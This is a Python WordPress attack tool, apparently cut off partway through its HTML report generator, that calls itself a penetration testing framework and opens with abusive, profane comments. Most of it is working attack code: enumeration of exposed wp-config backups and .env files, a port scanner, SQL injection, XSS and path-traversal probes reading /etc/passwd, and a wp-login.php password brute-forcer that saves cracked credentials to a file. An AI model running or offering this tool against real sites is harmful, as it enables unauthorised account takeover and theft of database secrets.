# WHAT ARE YOU GOING HERE . WANT TO ROB CODE . FUCK OUT FROM HERE
# ANTI BANTI CHANTI AGAR TU NAI CODE COPY KIA TU TERI MA RANDI . 
import requests
import sys
import os
import random
import threading
import time
import json
import re
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import ssl
from colorama import init, Fore, Back, Style
import dns.resolver

# Initialize colorama
init(autoreset=True)

# Clear screen
os.system('cls' if os.name == 'nt' else 'clear')

# Global variables
cracked = False
attempts = 0
lock = threading.Lock()
start_time = datetime.now()
vulnerabilities_found = []
wordpress_detected = False

# Banner
BANNER = f"""
{Fore.RED}
███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗
██╔════╝██║  ██║██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝
███████╗███████║██████╔╝██║     ██║   ██║██║   ██║   ███████╗
╚════██║██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║   ╚════██║
███████║██║  ██║██║     ███████╗╚██████╔╝██║   ██║   ███████║
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝

{Fore.CYAN}     WordPress Penetration Testing Framework
{Fore.YELLOW}     Version 1.0 | By Security Researchers
{Fore.WHITE}     Made By Ayyan-ahmed-khan NickName : Mr.Robot From Pakistan
{Fore.RED}     ════════════════════════════════════════════════
"""

class Scanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        })
        self.results = {
            'vulnerabilities': [],
            'users': [],
            'plugins': [],
            'themes': [],
            'config': {},
            'files': [],
            'directories': [],
            'ports': []
        }
    
    def check_wordpress(self):
        """Check if target is WordPress"""
        try:
            resp = self.session.get(self.target, timeout=5)
            if 'wp-content' in resp.text or 'wordpress' in resp.text.lower():
                return True
            
            # Check common WordPress paths
            wp_paths = ['/wp-admin/', '/wp-login.php', '/wp-includes/', '/xmlrpc.php']
            for path in wp_paths:
                try:
                    r = self.session.get(urljoin(self.target, path), timeout=3)
                    if r.status_code == 200:
                        return True
                except:
                    continue
            return False
        except:
            return False
    
    def scan_robots_txt(self):
        """Scan robots.txt for sensitive information"""
        try:
            url = urljoin(self.target, '/robots.txt')
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200:
                lines = resp.text.split('\n')
                sensitive_paths = []
                
                for line in lines:
                    if line.startswith('Disallow:'):
                        path = line.split(':')[1].strip()
                        if any(keyword in path.lower() for keyword in ['admin', 'wp-', 'config', 'backup', 'sql', 'install']):
                            sensitive_paths.append(path)
                            vulnerabilities_found.append(f"robots.txt exposes sensitive path: {path}")
                
                if sensitive_paths:
                    return {
                        'status': 'VULNERABLE',
                        'paths': sensitive_paths
                    }
                return {'status': 'FOUND', 'content': resp.text[:500]}
        except:
            return {'status': 'NOT_FOUND'}
    
    def scan_sitemap_xml(self):
        """Scan sitemap.xml for sensitive URLs"""
        try:
            url = urljoin(self.target, '/sitemap.xml')
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200:
                return {'status': 'FOUND', 'content': resp.text[:500]}
        except:
            return {'status': 'NOT_FOUND'}
    
    def scan_backup_files(self):
        """Check for common backup files"""
        backup_files = [
            'wp-config.php.bak', 'wp-config.php.backup', 'wp-config.php.old',
            'wp-config.php.save', '.htaccess.bak', '.htaccess.backup',
            'database.sql', 'backup.sql', 'wp-backup.zip', 'backup.zip',
            'wp-content/backup/', 'wp-content/uploads/backup/'
        ]
        
        found_backups = []
        for file in backup_files:
            try:
                url = urljoin(self.target, file)
                resp = self.session.get(url, timeout=3)
                if resp.status_code == 200 and len(resp.content) > 0:
                    found_backups.append(file)
                    vulnerabilities_found.append(f"Backup file found: {file}")
            except:
                continue
        
        return found_backups
    
    def directory_listing(self):
        """Check for directory listing vulnerabilities"""
        dirs_to_check = [
            '/wp-content/uploads/', '/wp-content/plugins/', '/wp-includes/',
            '/wp-admin/', '/wp-content/themes/', '/backup/', '/admin/'
        ]
        
        vulnerable_dirs = []
        for directory in dirs_to_check:
            try:
                url = urljoin(self.target, directory)
                resp = self.session.get(url, timeout=3)
                if resp.status_code == 200 and ('Index of' in resp.text or 'Parent Directory' in resp.text):
                    vulnerable_dirs.append(directory)
                    vulnerabilities_found.append(f"Directory listing enabled: {directory}")
            except:
                continue
        
        return vulnerable_dirs
    
    def find_config_files(self):
        """Look for configuration files"""
        config_files = [
            'wp-config.php', 'configuration.php', 'config.php',
            'settings.php', '.env', '.env.local', '.env.production'
        ]
        
        found_configs = []
        for file in config_files:
            try:
                url = urljoin(self.target, file)
                resp = self.session.get(url, timeout=3)
                if resp.status_code == 200:
                    # Check if it looks like a config file
                    content = resp.text.lower()
                    if any(keyword in content for keyword in ['db_', 'password', 'database', 'define(']):
                        found_configs.append(file)
                        vulnerabilities_found.append(f"Configuration file exposed: {file}")
            except:
                continue
        
        return found_configs
    
    def check_xmlrpc(self):
        """Check XML-RPC functionality"""
        try:
            url = urljoin(self.target, '/xmlrpc.php')
            resp = self.session.post(url, data='<methodCall><methodName>system.listMethods</methodName></methodCall>', 
                                   timeout=5, headers={'Content-Type': 'text/xml'})
            
            if resp.status_code == 200 and 'methodResponse' in resp.text:
                vulnerabilities_found.append("XML-RPC enabled (can be used for brute force)")
                return True
        except:
            pass
        return False
    
    def wp_version_detection(self):
        """Detect WordPress version"""
        try:
            resp = self.session.get(self.target, timeout=5)
            # Check generator meta tag
            version_patterns = [
                r'content="WordPress (\d+\.\d+(\.\d+)?)"',
                r'/wp-includes/js/wp-embed.min.js\?ver=(\d+\.\d+(\.\d+)?)',
                r'/wp-includes/css/dist/block-library/style.min.css\?ver=(\d+\.\d+(\.\d+)?)'
            ]
            
            for pattern in version_patterns:
                match = re.search(pattern, resp.text)
                if match:
                    version = match.group(1)
                    return version
        except:
            pass
        return "Unknown"
    
    def enumerate_plugins(self):
        """Enumerate installed plugins"""
        plugins = []
        
        # Common plugins to check
        common_plugins = [
            'contact-form-7', 'yoast-seo', 'elementor', 'woocommerce',
            'akismet', 'jetpack', 'all-in-one-seo-pack', 'google-sitemap-generator',
            'wp-super-cache', 'w3-total-cache'
        ]
        
        for plugin in common_plugins:
            urls_to_check = [
                f'/wp-content/plugins/{plugin}/',
                f'/wp-content/plugins/{plugin}/readme.txt',
                f'/wp-content/plugins/{plugin}/{plugin}.php'
            ]
            
            for url_path in urls_to_check:
                try:
                    url = urljoin(self.target, url_path)
                    resp = self.session.get(url, timeout=3)
                    if resp.status_code == 200:
                        plugins.append(plugin)
                        break
                except:
                    continue
        
        return plugins
    
    def enumerate_themes(self):
        """Enumerate installed themes"""
        themes = []
        
        try:
            resp = self.session.get(self.target, timeout=5)
            # Look for theme directory in source
            theme_patterns = [
                r'/wp-content/themes/([^/]+)/',
                r'theme-([^/]+)',
                r'template:([^/]+)'
            ]
            
            for pattern in theme_patterns:
                matches = re.findall(pattern, resp.text, re.IGNORECASE)
                for match in matches:
                    if match and match not in themes:
                        themes.append(match)
        except:
            pass
        
        return themes
    
    def check_error_messages(self):
        """Check for sensitive error messages"""
        try:
            # Try to trigger an error
            url = urljoin(self.target, '/?p=999999999')
            resp = self.session.get(url, timeout=5)
            
            error_keywords = ['mysql', 'database', 'error', 'warning', 'undefined', 'syntax']
            for keyword in error_keywords:
                if keyword in resp.text.lower():
                    vulnerabilities_found.append(f"Error messages exposed containing: {keyword}")
                    return True
        except:
            pass
        return False
    
    def port_scan(self, hostname):
        """Quick port scan"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                       993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((hostname, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_port, port) for port in common_ports]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
        
        return open_ports
    
    def ssl_check(self, hostname):
        """Check SSL certificate"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check expiry
                    expiry_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (expiry_date - datetime.now()).days
                    
                    if days_left < 30:
                        vulnerabilities_found.append(f"SSL certificate expires in {days_left} days")
                    
                    return {
                        'issuer': cert.get('issuer', []),
                        'expiry': expiry_date,
                        'days_left': days_left
                    }
        except:
            return None

def print_banner():
    """Print animated banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    for line in BANNER.split('\n'):
        print(line)
        time.sleep(0.05)
    print()

def loading_animation(message, duration=2):
    """Display loading animation"""
    print(f"{Fore.CYAN}{message}", end='', flush=True)
    start_time = time.time()
    while time.time() - start_time < duration:
        for i in range(3):
            dots = '.' * (i + 1)
            print(f'\r{Fore.CYAN}{message}{dots}   ', end='', flush=True)
            time.sleep(0.3)
    print(f'\r{Fore.GREEN}{message}... DONE!{Style.RESET_ALL}')

def typewriter(text, delay=0.03):
    """Typewriter effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def display_menu():
    """Display main menu"""
    print(f"\n{Fore.YELLOW}╔══════════════════════════════════════════════════════════════╗")
    print(f"║                 {Fore.RED}MAIN MENU - SELECT OPTION{Fore.YELLOW}                 ║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    print(f"║  {Fore.CYAN}1.{Fore.WHITE} Full Automated Scan & Exploit                        {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}2.{Fore.WHITE} Reconnaissance Only (Find Weak Points)              {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}3.{Fore.WHITE} Brute Force Attack Only                             {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}4.{Fore.WHITE} Vulnerability Scanner                              {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}5.{Fore.WHITE} Directory/File Discovery                           {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}6.{Fore.WHITE} Port Scanner                                       {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}7.{Fore.WHITE} SSL/TLS Checker                                    {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}8.{Fore.WHITE} WordPress Specific Scanner                         {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}9.{Fore.WHITE} Generate Report                                    {Fore.YELLOW}║")
    print(f"║  {Fore.CYAN}0.{Fore.WHITE} Exit                                               {Fore.YELLOW}║")
    print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}@{Fore.RED}ROOT{Fore.GREEN}]#{Fore.WHITE} ")
    return choice

def full_scan(target):
    """Perform full automated scan"""
    print(f"\n{Fore.RED}[!]{Fore.YELLOW} Starting Full Automated Scan on: {target}{Style.RESET_ALL}")
    
    scanner = Scanner(target)
    
    # Check if WordPress
    loading_animation("Checking if target is WordPress", 1)
    if scanner.check_wordpress():
        print(f"{Fore.GREEN}[+]{Fore.WHITE} WordPress detected!")
        wordpress_detected = True
    else:
        print(f"{Fore.YELLOW}[!]{Fore.WHITE} Target doesn't appear to be WordPress")
        wordpress_detected = False
    
    # Scan robots.txt
    loading_animation("Scanning robots.txt", 1)
    robots_result = scanner.scan_robots_txt()
    if robots_result['status'] == 'VULNERABLE':
        print(f"{Fore.RED}[!]{Fore.WHITE} robots.txt exposes sensitive paths")
    elif robots_result['status'] == 'FOUND':
        print(f"{Fore.GREEN}[+]{Fore.WHITE} robots.txt found")
    
    # Scan sitemap
    loading_animation("Scanning sitemap.xml", 1)
    sitemap_result = scanner.scan_sitemap_xml()
    if sitemap_result['status'] == 'FOUND':
        print(f"{Fore.GREEN}[+]{Fore.WHITE} sitemap.xml found")
    
    # Check backup files
    loading_animation("Checking for backup files", 1)
    backups = scanner.scan_backup_files()
    if backups:
        print(f"{Fore.RED}[!]{Fore.WHITE} Found backup files: {len(backups)}")
    
    # Check directory listing
    loading_animation("Checking for directory listing", 1)
    dirs = scanner.directory_listing()
    if dirs:
        print(f"{Fore.RED}[!]{Fore.WHITE} Directory listing enabled: {len(dirs)} directories")
    
    # Check config files
    loading_animation("Checking for exposed config files", 1)
    configs = scanner.find_config_files()
    if configs:
        print(f"{Fore.RED}[!]{Fore.WHITE} Exposed config files: {len(configs)}")
    
    # Check XML-RPC
    loading_animation("Checking XML-RPC", 1)
    if scanner.check_xmlrpc():
        print(f"{Fore.RED}[!]{Fore.WHITE} XML-RPC enabled (brute force possible)")
    
    # WordPress specific checks
    if wordpress_detected:
        loading_animation("Detecting WordPress version", 1)
        version = scanner.wp_version_detection()
        print(f"{Fore.GREEN}[+]{Fore.WHITE} WordPress version: {version}")
        
        loading_animation("Enumerating plugins", 1)
        plugins = scanner.enumerate_plugins()
        if plugins:
            print(f"{Fore.GREEN}[+]{Fore.WHITE} Plugins found: {', '.join(plugins[:5])}")
            if len(plugins) > 5:
                print(f"      ... and {len(plugins)-5} more")
        
        loading_animation("Enumerating themes", 1)
        themes = scanner.enumerate_themes()
        if themes:
            print(f"{Fore.GREEN}[+]{Fore.WHITE} Themes found: {', '.join(themes[:3])}")
    
    # Check error messages
    loading_animation("Checking for error messages", 1)
    if scanner.check_error_messages():
        print(f"{Fore.RED}[!]{Fore.WHITE} Error messages exposed")
    
    # Parse domain for port scan
    try:
        domain = urlparse(target).hostname
        loading_animation(f"Scanning ports on {domain}", 2)
        open_ports = scanner.port_scan(domain)
        if open_ports:
            print(f"{Fore.GREEN}[+]{Fore.WHITE} Open ports: {', '.join(map(str, open_ports))}")
    except:
        pass
    
    # SSL Check
    try:
        loading_animation("Checking SSL certificate", 1)
        ssl_info = scanner.ssl_check(domain)
        if ssl_info:
            print(f"{Fore.GREEN}[+]{Fore.WHITE} SSL Certificate expires in {ssl_info['days_left']} days")
    except:
        pass
    
    # Display summary
    print(f"\n{Fore.RED}══════════════════════════════════════════════════════════════")
    print(f"{Fore.YELLOW}                SCAN SUMMARY")
    print(f"{Fore.RED}══════════════════════════════════════════════════════════════{Style.RESET_ALL}")
    
    if vulnerabilities_found:
        print(f"\n{Fore.RED}[!]{Fore.WHITE} VULNERABILITIES FOUND:")
        for i, vuln in enumerate(vulnerabilities_found, 1):
            print(f"    {Fore.RED}[{i}]{Fore.WHITE} {vuln}")
    else:
        print(f"\n{Fore.GREEN}[+]{Fore.WHITE} No critical vulnerabilities found")
    
    # Ask for brute force
    print(f"\n{Fore.YELLOW}══════════════════════════════════════════════════════════════")
    choice = input(f"{Fore.GREEN}Start brute force attack? (y/n): {Fore.WHITE}").lower()
    
    if choice == 'y':
        brute_force_attack(target)
    
    return vulnerabilities_found

def brute_force_attack(target):
    """Perform brute force attack"""
    print(f"\n{Fore.RED}[!]{Fore.YELLOW} Starting Brute Force Attack{Style.RESET_ALL}")
    
    # Get username
    username = input(f"{Fore.GREEN}Enter username (or press enter to use 'admin'): {Fore.WHITE}")
    if not username:
        username = 'admin'
    
    # Get wordlist
    wordlist_path = input(f"{Fore.GREEN}Enter path to password wordlist: {Fore.WHITE}")
    
    if not os.path.exists(wordlist_path):
        print(f"{Fore.RED}[!]{Fore.WHITE} Wordlist not found!")
        return
    
    # Load passwords
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
        print(f"{Fore.GREEN}[+]{Fore.WHITE} Loaded {len(passwords)} passwords")
    except:
        print(f"{Fore.RED}[!]{Fore.WHITE} Error loading wordlist")
        return
    
    login_url = urljoin(target, '/wp-login.php')
    session = requests.Session()
    
    print(f"\n{Fore.YELLOW}[*]{Fore.WHITE} Starting attack on {login_url}")
    print(f"{Fore.YELLOW}[*]{Fore.WHITE} Target username: {username}")
    print(f"{Fore.YELLOW}[*]{Fore.WHITE} Press Ctrl+C to stop\n")
    
    try:
        for i, password in enumerate(passwords, 1):
            try:
                # Show progress
                if i % 50 == 0:
                    print(f"{Fore.CYAN}[{i}/{len(passwords)}]{Fore.WHITE} Trying: {password[:20]}...")
                
                data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': f"{target}/wp-admin/",
                    'testcookie': '1'
                }
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': login_url
                }
                
                response = session.post(login_url, data=data, headers=headers, 
                                      allow_redirects=False, timeout=5)
                
                # Check for success
                if response.status_code == 302 or 'wordpress_logged_in' in str(response.headers.get('Set-Cookie', '')):
                    print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.GREEN}║                    CRACKED! PASSWORD FOUND                     ║")
                    print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════════╣")
                    print(f"{Fore.GREEN}║  Username: {username:<45} ║")
                    print(f"{Fore.GREEN}║  Password: {password:<45} ║")
                    print(f"{Fore.GREEN}║  Attempts: {i:<45} ║")
                    print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                    
                    # Save to file
                    with open('cracked_credentials.txt', 'a') as f:
                        f.write(f"Target: {target}\n")
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password}\n")
                        f.write(f"Time: {datetime.now()}\n")
                        f.write("-" * 50 + "\n")
                    
                    print(f"{Fore.GREEN}[+]{Fore.WHITE} Credentials saved to cracked_credentials.txt")
                    return True
                
                time.sleep(0.1)  # Rate limiting
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} Attack interrupted by user")
                break
            except:
                continue
        
        print(f"\n{Fore.RED}[!]{Fore.WHITE} Password not found in wordlist")
        return False
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} Attack interrupted")
        return False

def recon_only(target):
    """Reconnaissance only mode"""
    print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} Starting Reconnaissance on: {target}")
    
    scanner = Scanner(target)
    
    checks = [
        ("Checking if WordPress", scanner.check_wordpress),
        ("Scanning robots.txt", scanner.scan_robots_txt),
        ("Scanning sitemap.xml", scanner.scan_sitemap_xml),
        ("Looking for backup files", scanner.scan_backup_files),
        ("Checking directory listing", scanner.directory_listing),
        ("Looking for config files", scanner.find_config_files),
        ("Checking XML-RPC", scanner.check_xmlrpc),
        ("Checking error messages", scanner.check_error_messages)
    ]
    
    results = {}
    for check_name, check_func in checks:
        loading_animation(check_name, 0.5)
        results[check_name] = check_func()
    
    # Display results
    print(f"\n{Fore.CYAN}══════════════════════════════════════════════════════════════")
    print(f"               RECONNAISSANCE RESULTS")
    print(f"══════════════════════════════════════════════════════════════{Style.RESET_ALL}")
    
    for check_name, result in results.items():
        if result:
            if isinstance(result, dict):
                if result.get('status') == 'VULNERABLE':
                    print(f"{Fore.RED}[!]{Fore.WHITE} {check_name}: VULNERABLE")
                elif result:
                    print(f"{Fore.GREEN}[+]{Fore.WHITE} {check_name}: Found")
            elif isinstance(result, list):
                if result:
                    print(f"{Fore.RED}[!]{Fore.WHITE} {check_name}: {len(result)} found")
            elif result == True:
                print(f"{Fore.RED}[!]{Fore.WHITE} {check_name}: Yes")
        else:
            print(f"{Fore.YELLOW}[-]{Fore.WHITE} {check_name}: Not found")
    
    return results

def vulnerability_scanner(target):
    """Specialized vulnerability scanner"""
    print(f"\n{Fore.RED}[!]{Fore.YELLOW} Running Vulnerability Scanner{Style.RESET_ALL}")
    
    scanner = Scanner(target)
    
    # Common WordPress vulnerabilities to check
    vuln_checks = [
        ("SQL Injection probes", [
            "/?id=1'", "/?page=1'", "/?cat=1'", "/wp-content/uploads/"
        ]),
        ("XSS probes", [
            "/?s=<script>alert(1)</script>",
            "/?search=<script>alert(1)</script>"
        ]),
        ("Path Traversal", [
            "/../../../../etc/passwd",
            "/wp-content/../../../etc/passwd"
        ]),
        ("File Inclusion", [
            "/?page=../../../../etc/passwd",
            "/wp-content/themes/twentyseventeen/../../../wp-config.php"
        ])
    ]
    
    found_vulns = []
    
    for vuln_name, probes in vuln_checks:
        loading_animation(f"Testing for {vuln_name}", 0.5)
        
        for probe in probes:
            try:
                url = urljoin(target, probe)
                resp = scanner.session.get(url, timeout=5)
                
                # Check for indicators
                if vuln_name == "SQL Injection probes" and ('sql' in resp.text.lower() or 'syntax' in resp.text.lower()):
                    found_vulns.append(f"{vuln_name} - Possible at {probe}")
                elif vuln_name == "XSS probes" and probe in resp.text:
                    found_vulns.append(f"{vuln_name} - Possible at {probe}")
                elif vuln_name == "Path Traversal" and ('root:' in resp.text or 'daemon:' in resp.text):
                    found_vulns.append(f"{vuln_name} - Possible at {probe}")
                elif vuln_name == "File Inclusion" and ('DB_NAME' in resp.text or 'db_password' in resp.text.lower()):
                    found_vulns.append(f"{vuln_name} - Possible at {probe}")
                    
            except:
                continue
    
    # Display results
    if found_vulns:
        print(f"\n{Fore.RED}══════════════════════════════════════════════════════════════")
        print(f"           VULNERABILITIES DETECTED!")
        print(f"══════════════════════════════════════════════════════════════{Style.RESET_ALL}")
        
        for i, vuln in enumerate(found_vulns, 1):
            print(f"{Fore.RED}[{i}]{Fore.WHITE} {vuln}")
    else:
        print(f"\n{Fore.GREEN}[+]{Fore.WHITE} No common vulnerabilities detected")
    
    return found_vulns

def directory_discovery(target):
    """Directory and file discovery"""
    print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} Starting Directory/File Discovery")
    
    # Common directories and files
    common_paths = [
        # WordPress specific
        '/wp-admin/', '/wp-login.php', '/wp-config.php', '/xmlrpc.php',
        '/wp-includes/', '/wp-content/', '/readme.html',
        
        # Common directories
        '/admin/', '/administrator/', '/backup/', '/backups/',
        '/config/', '/database/', '/db/', '/sql/', '/data/',
        
        # Common files
        '/.git/', '/.svn/', '/.env', '/.htaccess', '/robots.txt',
        '/sitemap.xml', '/crossdomain.xml', '/phpinfo.php',
        
        # Backup extensions
        '/wp-config.php.bak', '/wp-config.php.backup', '/wp-config.php.old',
        '/.htaccess.bak', '/.htaccess.backup'
    ]
    
    scanner = Scanner(target)
    found_paths = []
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for path in common_paths:
            url = urljoin(target, path)
            futures.append(executor.submit(scanner.session.get, url, timeout=3))
        
        for i, future in enumerate(as_completed(futures)):
            try:
                response = future.result()
                path = common_paths[i]
                
                if response.status_code == 200:
                    found_paths.append((path, response.status_code))
                    print(f"{Fore.GREEN}[+]{Fore.WHITE} Found: {path} ({response.status_code})")
                elif response.status_code == 403:
                    print(f"{Fore.YELLOW}[*]{Fore.WHITE} Forbidden: {path} ({response.status_code})")
                elif response.status_code == 301 or response.status_code == 302:
                    print(f"{Fore.CYAN}[>]{Fore.WHITE} Redirect: {path} -> {response.headers.get('Location', 'Unknown')}")
                    
            except:
                continue
    
    print(f"\n{Fore.GREEN}[+]{Fore.WHITE} Discovery complete. Found {len(found_paths)} accessible paths.")
    return found_paths

def port_scan_menu(target):
    """Port scanning menu"""
    try:
        domain = urlparse(target).hostname
        print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} Port Scanning: {domain}")
        
        scanner = Scanner(target)
        ports = scanner.port_scan(domain)
        
        if ports:
            print(f"\n{Fore.GREEN}[+]{Fore.WHITE} Open ports found:")
            for port in ports:
                # Get service name
                services = {
                    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
                    53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC',
                    135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP',
                    443: 'HTTPS', 445: 'SMB', 993: 'IMAPS',
                    995: 'POP3S', 1723: 'PPTP', 3306: 'MySQL',
                    3389: 'RDP', 5900: 'VNC', 8080: 'HTTP-Proxy',
                    8443: 'HTTPS-Alt'
                }
                service = services.get(port, 'Unknown')
                print(f"    {Fore.CYAN}Port {port:5}{Fore.WHITE} - {service}")
        else:
            print(f"{Fore.YELLOW}[-]{Fore.WHITE} No common ports open")
            
    except Exception as e:
        print(f"{Fore.RED}[!]{Fore.WHITE} Error: {e}")

def ssl_checker_menu(target):
    """SSL/TLS checker"""
    try:
        domain = urlparse(target).hostname
        print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} SSL/TLS Check for: {domain}")
        
        scanner = Scanner(target)
        ssl_info = scanner.ssl_check(domain)
        
        if ssl_info:
            print(f"\n{Fore.GREEN}[+]{Fore.WHITE} SSL Certificate Information:")
            print(f"    {Fore.CYAN}Issuer:{Fore.WHITE} {ssl_info['issuer']}")
            print(f"    {Fore.CYAN}Expires:{Fore.WHITE} {ssl_info['expiry']}")
            
            if ssl_info['days_left'] < 30:
                print(f"    {Fore.RED}WARNING:{Fore.WHITE} Certificate expires in {ssl_info['days_left']} days!")
            else:
                print(f"    {Fore.GREEN}Valid:{Fore.WHITE} Certificate valid for {ssl_info['days_left']} more days")
        else:
            print(f"{Fore.YELLOW}[-]{Fore.WHITE} No SSL certificate found or not using HTTPS")
            
    except Exception as e:
        print(f"{Fore.RED}[!]{Fore.WHITE} Error: {e}")

def wp_scanner_menu(target):
    """WordPress specific scanner"""
    print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} WordPress Scanner for: {target}")
    
    scanner = Scanner(target)
    
    # Check if WordPress
    if not scanner.check_wordpress():
        print(f"{Fore.RED}[!]{Fore.WHITE} Target doesn't appear to be WordPress")
        return
    
    print(f"{Fore.GREEN}[+]{Fore.WHITE} WordPress detected!")
    
    # Get version
    version = scanner.wp_version_detection()
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Version: {version}")
    
    # Get plugins
    plugins = scanner.enumerate_plugins()
    if plugins:
        print(f"\n{Fore.GREEN}[+]{Fore.WHITE} Plugins found ({len(plugins)}):")
        for plugin in plugins[:10]:  # Show first 10
            print(f"    {Fore.CYAN}-{Fore.WHITE} {plugin}")
        if len(plugins) > 10:
            print(f"    {Fore.YELLOW}... and {len(plugins)-10} more")
    
    # Get themes
    themes = scanner.enumerate_themes()
    if themes:
        print(f"\n{Fore.GREEN}[+]{Fore.WHITE} Themes found ({len(themes)}):")
        for theme in themes[:5]:  # Show first 5
            print(f"    {Fore.CYAN}-{Fore.WHITE} {theme}")
        if len(themes) > 5:
            print(f"    {Fore.YELLOW}... and {len(themes)-5} more")
    
    # Check for common WordPress vulnerabilities
    print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} Checking for common WordPress issues...")
    
    wp_vulns = []
    
    # Check readme.html
    try:
        url = urljoin(target, '/readme.html')
        resp = scanner.session.get(url, timeout=3)
        if resp.status_code == 200 and 'WordPress' in resp.text:
            wp_vulns.append("Readme file exposed (information disclosure)")
    except:
        pass
    
    # Check for user enumeration via author pages
    try:
        for i in range(1, 5):
            url = urljoin(target, f'/?author={i}')
            resp = scanner.session.get(url, timeout=3, allow_redirects=False)
            if resp.status_code in [301, 302]:
                wp_vulns.append(f"User enumeration possible via author={i}")
    except:
        pass
    
    # Display WordPress vulnerabilities
    if wp_vulns:
        print(f"\n{Fore.RED}[!]{Fore.WHITE} WordPress issues found:")
        for vuln in wp_vulns:
            print(f"    {Fore.RED}*{Fore.WHITE} {vuln}")
    else:
        print(f"{Fore.GREEN}[+]{Fore.WHITE} No common WordPress issues found")

def generate_report(target, results):
    """Generate HTML report"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_report_{timestamp}.html"
    
    html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Scan Report - {target}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background: #161b22; padding: 20px; border-radius: 10px; margin-bottom: 20px; }}
        .section {{ background: #161b22; padding: 20px; border-radius: 10px; margin-bottom: 20px; }}
        .vuln {{ background: #2d2424; padding: 10px; margin: 10px 0; border-left: 4px solid #f85149; }}
        .info {{ background: #1c2b2b; padding: 10px; margin: 10px 0; border-left: 4px solid #2ea043; }}
        .warning {{ background: #2d2d24; padding: 10px; margin: 10px 0; border-left: 4px solid #d29922; }}
        h1 {{ color: #f85149; }}
        h2 {{ color: #2ea043; }}
        h3 {{ color: #d29922; }}
        .timestamp {{ color: #8b949e; font-size: 0.9em; }}
        .critical {{ color: #f85149; font-weight: bold; }}
        .medium {{ color: #d29922; font-weight: bold; }}
        .low {{ color: #2ea043; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Security Scan Report</h1>
            <p><strong>Target:</strong> {target}</p>
            <p><strong>Scan Date:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            <p class="timestamp">Generated by EXPLOIT Framework v3.0</p>
        </div>
        
        <div class="section">
            <h2>📊 Scan Summary</h2>
            <p><strong>Total Vulnerabilities Found:</strong> <span class="critical">{len(vulnerabilities_found)}</span></p>
            <p><strong>WordPress Detected:</strong> {wordpress_detected}</p>
